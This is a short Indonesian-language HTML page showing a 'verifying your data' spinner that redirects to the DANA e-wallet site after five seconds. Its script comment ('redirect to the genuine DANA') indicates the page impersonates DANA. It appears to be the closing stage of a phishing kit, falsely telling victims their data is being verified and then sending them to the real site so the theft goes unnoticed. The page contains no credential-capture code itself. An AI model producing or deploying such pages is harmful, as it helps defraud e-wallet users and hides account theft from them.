<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memproses...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: linear-gradient(145deg, #f5f9ff 0%, #e8f2fa 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .card {
            background: white;
            padding: 48px 32px;
            border-radius: 32px;
            box-shadow: 0 12px 40px rgba(0, 100, 200, 0.10);
            text-align: center;
            max-width: 340px;
            width: 100%;
        }
        .spinner {
            margin: 0 auto 20px;
            display: block;
        }
        h3 {
            color: #1a1a1a;
            font-size: 20px;
            margin-bottom: 8px;
        }
        p {
            color: #777;
            font-size: 14px;
            line-height: 1.6;
        }
        .note {
            font-size: 12px;
            color: #bbb;
            margin-top: 16px;
        }
    </style>
</head>
<body>
<div class="card">
    <!-- Animasi spinner SVG -->
    <svg class="spinner" width="56" height="56" viewBox="0 0 56 56">
        <circle cx="28" cy="28" r="22" fill="none" stroke="#e8f2fa" stroke-width="4"/>
        <circle cx="28" cy="28" r="22" fill="none" stroke="#0099ff" stroke-width="4"
            stroke-dasharray="40 100" stroke-linecap="round">
            <animateTransform attributeName="transform" type="rotate" from="0 28 28" to="360 28 28" dur="1s" repeatCount="indefinite"/>
        </circle>
    </svg>

    <h3>Sedang memproses</h3>
    <p>Harap tunggu beberapa saat,<br>kami sedang memverifikasi data Anda.</p>
    <div class="note">Anda akan dialihkan secara otomatis</div>
</div>

<script>
    // Redirect ke DANA asli setelah 5 detik
    setTimeout(function() {
        window.location.href = "https://www.dana.id";
    }, 5000);
</script>
</body>
</html>
